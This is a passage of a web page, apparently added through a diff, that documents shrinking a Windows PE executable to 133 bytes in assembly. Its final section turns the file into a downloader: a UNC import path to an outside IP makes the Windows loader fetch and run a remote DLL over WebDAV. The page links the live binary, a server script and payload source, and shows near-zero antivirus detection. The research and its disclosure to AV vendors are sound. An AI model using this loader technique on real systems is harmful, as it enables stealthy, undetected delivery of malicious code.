+idata:
+<span style="color: red;">    dd ilt                                    ; OriginalFirstThunk UNUSED</span>
+<span style="color: red;">    dd 0                                      ; TimeDateStamp UNUSED</span>
+<span style="color: red;">    dd 0                                      ; ForwarderChain UNUSED</span>
+    dd kernel32                               ; Name
+    dd iat                                    ; FirstThunk
+
+    ; empty IMAGE_IMPORT_DESCRIPTOR structure
+
+<span style="color: red;">    dd 0                                      ; OriginalFirstThunk UNUSED</span>
+<span style="color: red;">    dd 0                                      ; TimeDateStamp UNUSED</span>
+<span style="color: red;">    dd 0                                      ; ForwarderChain UNUSED</span>
+<span style="color: red;">    dd 0                                      ; Name UNUSED</span>
+    dd 0                                      ; FirstThunk
+
+idatasize equ $ - idata
+
+; Import address table (array of IMAGE_THUNK_DATA structures)
+
+iat:
+    dd 0x80000001                             ; Import function 1 by ordinal
+    dd 0
+
+; Import lookup table (array of IMAGE_THUNK_DATA structures)
+
+ilt:
+    dd 0x80000001                             ; Import function 1 by ordinal
+    dd 0
+
+kernel32:
+    db "KERNEL32.dll", 0
+
+codesize equ $ - start
+
+filesize equ $ - $$
+</pre>
+
+<p>With a single ordinal import the size of our PE file incresed to <b>209</b>
+bytes.</p>
+
+<p class="download">
+    <a href="tiny.import.209/tiny.asm">tiny.asm</a> |
+    <a href="tiny.import.209/tiny.exe">tiny.exe</a> |
+    <a href="tiny.import.209/Makefile">Makefile</a>
+</p>
+
+
+<h3>Collapsing the import table</h3>
+
+<p>209 bytes are obivousely too much for a single imported function, so let's
+see how we can make the file smaller. The first thing we'll do is to remove the
+Import Lookup Table. This table is a copy of the IAT and doesn't seem to be
+used by the linker. Removing it will save us 8 bytes.</p>
+
+<p>The import table is 40 bytes long, but only three of the fields in it are
+used. This allows us to collapse the import table into the PE optional header.
+</p>
+
+<pre class="code">
+;
+; Import table (array of IMAGE_IMPORT_DESCRIPTOR structures)
+;
+
+idata:
+    dd 0x400000                          ; ImageBase                          ; PointerToRelocations UNUSED ; OriginalFirstThunk UNUSED
+    dd sectalign  ; e_lfanew             ; SectionAlignment                   ; PointerToLinenumbers UNUSED ; TimeDateStamp UNUSED
+    dd filealign                         ; FileAlignment                      ; NumberOfRelocations UNUSED  ; ForwarderChain UNUSED
+                                                                              ; NumberOfLinenumbers UNUSED
+    dd kernel32                          ; MajorOperatingSystemVersion UNUSED ; Characteristics UNUSED      ; Name
+                                         ; MinorOperatingSystemVersion UNUSED                               ; FirstThunk
+    dd iat                               ; MajoirImageVersion UNUSED
+                                         ; MinorImageVersion UNUSED
+    dw 4                                 ; MajorSubsystemVersion                                            ; OriginalFirstThunk UNUSED
+<span style="color: red;">    dw 0                                 ; MinorSubsystemVersion UNUSED</span>
+<span style="color: red;">    dd 0                                 ; Win32VersionValue UNUSED                                         ; TimeDateStamp UNUSED</span>
+    dd round(hdrsize, sectalign)+round(codesize,sectalign) ; SizeOfImage                                    ; ForwarderChain UNUSED
+    dd round(hdrsize, filealign)         ; SizeOfHeaders                                                    ; Name UNUSED
+    dd 0                                 ; CheckSum UNUSED                                                  ; FirstThunk
+
+idatasize equ $ - idata
+
+    dw 2                                 ; Subsystem (Win32 GUI)
+<span style="color: red;">    dw 0                                 ; DllCharacteristics UNUSED</span>
+<span style="color: red;">    dd 0                                 ; SizeOfStackReserve</span>
+    dd 0                                 ; SizeOfStackCommit
+    dd 0                                 ; SizeOfHeapReserve
+    dd 0                                 ; SizeOfHeapCommit
+<span style="color: red;">    dd 0                                 ; LoaderFlags UNUSED</span>
+    dd 2                                 ; NumberOfRvaAndSizes
+</pre>
+
+<p>The PE file is now <b>161</b> bytes.</p>
+
+<p class="download">
+    <a href="tiny.import.161/tiny.asm">tiny.asm</a> |
+    <a href="tiny.import.161/tiny.exe">tiny.exe</a> |
+    <a href="tiny.import.161/Makefile">Makefile</a>
+</p>
+
+
+<h3>Collapsing the IAT and the DLL name</h3>
+
+<p>The last two structures left outside of the PE header are the IAT and the
+name of the imported DLL. We can collapse the IAT into the unused 8-byte Name
+field of the PE section header. The DLL name can be stored in the unused fields
+at the end of the PE optional header and in the 8 bytes of the export data
+directory. There is enough space for 15 characters and a null terminator for
+the name.</p>
+
+<p>The last field in the data directory is the size of the import table, but
+the size isn't really used by the loader and can be set to 0. The last three
+bytes of the import table pointer are also 0, because the pointer is stored as
+a little-endian dword. We can remove all the zero bytes from the end of the
+file, just like we did with the 97 byte PE file above.</p>
+
+<p>The full source code of the final PE file is given below:</p>
+
+<pre class="code">
+; tiny.asm
+
+BITS 32
+
+;
+; MZ header
+;
+; The only two fields that matter are e_magic and e_lfanew
+
+mzhdr:
+    dw "MZ"       ; e_magic
+<span style="color: red;">    dw 0          ; e_cblp UNUSED</span>
+
+;
+; PE signature
+;
+
+pesig:
+    dd "PE"       ; e_cp UNUSED          ; PE signature
+                  ; e_crlc UNUSED
+
+;
+; PE header
+;
+
+pehdr:
+    dw 0x014C     ; e_cparhdr UNUSED     ; Machine (Intel 386)
+    dw 1          ; e_minalloc UNUSED    ; NumberOfSections
+
+<span style="color: red;">;   dd 0xC3582A6A ; e_maxalloc UNUSED    ; TimeDateStamp UNUSED</span>
+;                 ; e_ss UNUSED
+
+; Entry point
+
+start:
+    push byte 42
+    pop eax
+    ret
+
+<span style="color: red;">    dd 0          ; e_sp UNUSED          ; PointerToSymbolTable UNUSED</span>
+                  ; e_csum UNUSED
+<span style="color: red;">    dd 0          ; e_ip UNUSED          ; NumberOfSymbols UNUSED</span>
+                  ; e_cs UNUSED
+    dw sections-opthdr ; e_lsarlc UNUSED ; SizeOfOptionalHeader
+    dw 0x103      ; e_ovno UNUSED        ; Characteristics
+
+;
+; PE optional header
+;
+; The debug directory size at offset 0x94 from here must be 0
+
+filealign equ 4
+sectalign equ 4   ; must be 4 because of e_lfanew
+
+%define round(n, r) (((n+(r-1))/r)*r)
+
+opthdr:
+    dw 0x10B      ; e_res UNUSED         ; Magic (PE32)
+<span style="color: red;">    db 8                                 ; MajorLinkerVersion UNUSED</span>
+<span style="color: red;">    db 0                                 ; MinorLinkerVersion UNUSED</span>
+
+;
+; PE code section and IAT
+;
+
+sections:
+iat:
+    dd 0x80000001                        ; SizeOfCode UNUSED                  ; Name UNUSED                 ; Import function 1 by ordinal
+    dd 0          ; e_oemid UNUSED       ; SizeOfInitializedData UNUSED                                     ; end of IAT
+                  ; e_oeminfo UNUSED
+    dd codesize   ; e_res2 UNUSED        ; SizeOfUninitializedData UNUSED     ; VirtualSize
+    dd start                             ; AddressOfEntryPoint                ; VirtualAddress
+    dd codesize                          ; BaseOfCode UNUSED                  ; SizeOfRawData
+    dd start                             ; BaseOfData UNUSED                  ; PointerToRawData
+
+;
+; Import table (array of IMAGE_IMPORT_DESCRIPTOR structures)
+;
+
+idata:
+    dd 0x400000                          ; ImageBase                          ; PointerToRelocations UNUSED ; OriginalFirstThunk UNUSED
+    dd sectalign  ; e_lfanew             ; SectionAlignment                   ; PointerToLinenumbers UNUSED ; TimeDateStamp UNUSED
+    dd filealign                         ; FileAlignment                      ; NumberOfRelocations UNUSED  ; ForwarderChain UNUSED
+                                                                              ; NumberOfLinenumbers UNUSED
+    dd kernel32                          ; MajorOperatingSystemVersion UNUSED ; Characteristics UNUSED      ; Name
+                                         ; MinorOperatingSystemVersion UNUSED                               ; FirstThunk
+    dd iat                               ; MajoirImageVersion UNUSED
+                                         ; MinorImageVersion UNUSED
+    dw 4                                 ; MajorSubsystemVersion                                            ; OriginalFirstThunk UNUSED
+<span style="color: red;">    dw 0                                 ; MinorSubsystemVersion UNUSED</span>
+<span style="color: red;">    dd 0                                 ; Win32VersionValue UNUSED                                         ; TimeDateStamp UNUSED</span>
+    dd round(hdrsize, sectalign)+round(codesize,sectalign) ; SizeOfImage                                    ; ForwarderChain UNUSED
+    dd round(hdrsize, filealign)         ; SizeOfHeaders                                                    ; Name UNUSED
+    dd 0                                 ; CheckSum UNUSED                                                  ; FirstThunk
+
+idatasize equ $ - idata
+
+    dw 2                                 ; Subsystem (Win32 GUI)
+<span style="color: red;">    dw 0                                 ; DllCharacteristics UNUSED</span>
+    dd 0                                 ; SizeOfStackReserve
+    dd 0                                 ; SizeOfStackCommit
+    dd 0                                 ; SizeOfHeapReserve
+    dd 0                                 ; SizeOfHeapCommit
+<span style="color: red;">;    dd 0                                 ; LoaderFlags UNUSED</span>
+<span style="color: red;">;    dd 2                                 ; NumberOfRvaAndSizes</span>
+
+;
+; The DLL name should be at most 16 bytes, including the null terminator
+;
+
+kernel32:
+    db "KERNEL32.dll", 0
+
+    times 16-($-kernel32) db 0
+
+;
+; Data directories
+;
+; The debug directory size at offset 0x34 from here must be 0
+
+<span style="color: red;">;    dd 0                                 ; Export Table UNUSED</span>
+;    dd 0
+
+    db idata - $$                        ; Import Table
+
+hdrsize equ $ - $$
+
+codesize equ $ - start
+
+filesize equ $ - $$
+</pre>
+
+<p>This brings the final file size to <b>133</b> bytes.</p>
+
+<p class="downloads">
+    <a href="tiny.import.133/tiny.asm">tiny.asm</a> |
+    <a href="tiny.import.133/tiny.exe">tiny.exe</a> |
+    <a href="tiny.import.133/Makefile">Makefile</a>
+</p>
+
+<h2>Smallest PE file that downloads a file from the Internet</h2>
+
+<p>The goal of the Tiny PE challenge was to write the smallest PE file that
+downloads a file from the Internet and executes it. The standard technique for
+this is to call URLDownloadToFileA and then WinExec to execute the file. There 
+are many examples of shellcode that uses this API, but it requires us to load
+URLMON.DLL and call multiple functions, which would increase the size of our PE
+file significantly.</p>
+
+<p>A less known feature of Windows XP is the WebDAV Mini-Redirector. It
+translates UNC paths used by all Windows applications to URLs and tries to
+access them over the WebDAV protocol. This means that we can pass a UNC path to
+WinExec and the redirector will attempt to download the specified file over
+WebDAV on port 80.</p>
+
+<p>Even more interesting is the fact that you can specify a UNC path in the
+import section of the PE file. If we specify \\66.93.68.6\z as the name of the
+imported DLL, the Windows loader will try to download the DLL file from our
+web server.</p>
+
+<p>This allows us to create a PE file that downloads and excutes a file from
+the Internet without executing a single line of code. All we have to do is put
+our payload in the DllMain function in the DLL, put the DLL on a publicly
+accessible WebDAV server and specify the UNC path to the file in the imports
+section of the PE file. When the loader processes the imports of the PE file,
+it will load the DLL from the WebDAV server and execute its DllMain
+function.</p>
+
+<pre class="code">
+;
+; The DLL name should be at most 16 bytes, including the null terminator
+;
+
+dllname:
+    db "\\66.93.68.6\z", 0
+    times 16-($-dllname) db 0
+</pre>
+
+<p>The size of the PE file with a UNC import is still only <b>133</b>
+bytes.</p>
+
+<p><b>WARNING:</b> The PE file linked below is live. It will attempt to
+download and execute a payload DLL from <a href="http://66.93.68.6/z">http://66.93.68.6/z</a>.
+The DLL will display a message box and exit, but you should take proper
+precautions and treat it as untrusted code.</p>
+
+<p class="download">
+    <a href="tiny.webdav.133/tiny.asm">tiny.asm</a> |
+    <a href="tiny.webdav.133/tiny.exe">tiny.exe</a> |
+    <a href="tiny.webdav.133/Makefile">Makefile</a>
+</p>
+
+<p>Setting up Apache or IIS as WebDAV servers is not complicated, but for
+development purposes you can use the following Ruby script. It will serve as
+minimial WebDAV server with just enough functionality for the attack to
+work:</p>
+
+<p class="download">
+    <a href="webdav.rb">webdav.rb</a>
+</p>
+
+<p>The payload DLL and its source are also available:</p>
+
+<p class="download">
+    <a href="payload.dll/payload.c">payload.c</a> |
+    <a href="payload.dll/payload.dll">payload.dll</a> |
+    <a href="payload.dll/test.c">test.c</a> |
+    <a href="payload.dll/test.exe">tiny.exe</a> |
+    <a href="payload.dll/Makefile">Makefile</a>
+</p>
+
+<h3>VirusTotal Results</h3>
+
+<p>Scanning the 133 byte PE file that downloads a DLL over WebDAV with common anti-virus
+software shows that the rate of detection is very low. My suggestion to AV vendors is to
+start using the presense of UNC imports as a malware heuristic.</p>
+
+<div class="virustotal">
+
+<p>Complete scanning result of "tiny.exe", received in
+<a href="http://www.virustotal.com">VirusTotal</a> at 11.08.2006, 07:14:08
+(CET).</p>
+
+<table border="0" cellpadding="0" cellspacing="0">
+<thead><tr>
+<td>Antivirus</td>
+<td>Version</td>
+<td align="center">Update</td>
+<td>Result</td>
+</tr></thead>
+<tbody>
+<tr>
+<td>AntiVir</td>
+<td>7.2.0.39</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Authentium</td>
+<td>4.93.8</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Avast</td>
+<td>4.7.892.0</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>AVG</td>
+<td>386</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>BitDefender</td>
+<td>7.2</td>
+<td align="center">11.08.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>CAT-QuickHeal</td>
+<td>8.00</td>
+<td align="center">11.07.2006</td>
+<td class="positive">(Suspicious) - DNAScan</td>
+</tr>
+<tr>
+<td>ClamAV</td>
+<td>devel-20060426</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>DrWeb</td>
+<td>4.33</td>
+<td align="center">11.08.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>eTrust-InoculateIT</td>
+<td>23.73.49</td>
+<td align="center">11.08.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>eTrust-Vet</td>
+<td>30.3.3181</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Ewido</td>
+<td>4.0</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Fortinet</td>
+<td>2.82.0.0</td>
+<td align="center">11.08.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>F-Prot</td>
+<td>3.16f</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>F-Prot4</td>
+<td>4.2.1.29</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Ikarus</td>
+<td>0.2.65.0</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Kaspersky</td>
+<td>4.0.2.24</td>
+<td align="center">11.08.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>McAfee</td>
+<td>4890</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>1.1609 </td>
+<td align="center">11.08.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>NOD32v2</td>
+<td>1.1858</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Norman</td>
+<td>5.80.02</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Panda</td>
+<td>9.0.0.4</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>Sophos</td>
+<td>4.11.0</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>TheHacker</td>
+<td>6.0.1.114</td>
+<td align="center">11.08.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>UNA</td>
+<td>1.83</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>VBA32</td>
+<td>3.11.1</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+<tr>
+<td>VirusBuster</td>
+<td>4.3.15:9</td>
+<td align="center">11.07.2006</td>
+<td class="negative">no virus found</td>
+</tr>
+</tbody>
+</table>
+
+<table border="0" cellpadding="0" cellspacing="0">
+<thead><tr><td>Additional Information</td></tr></thead>
+<tbody>
+<tr><td>File size: 133 bytes</td></tr>
+<tr><td>MD5: a6d732dd4b460000151a5f3cb448a4be</td></tr>
+<tr><td>SHA1: 3bdd0363204f3db7d0e15af2a64081ce04e57533</td></tr>
+</tbody>
+</table>
+
+</div>
+
+</div>
+<div id="footer"></div>
+</div></div></div></div></div></div></div></div></div></div>
+<script type="text/javascript" src="../../phreedom.js"></script>
+</body>
+</html>
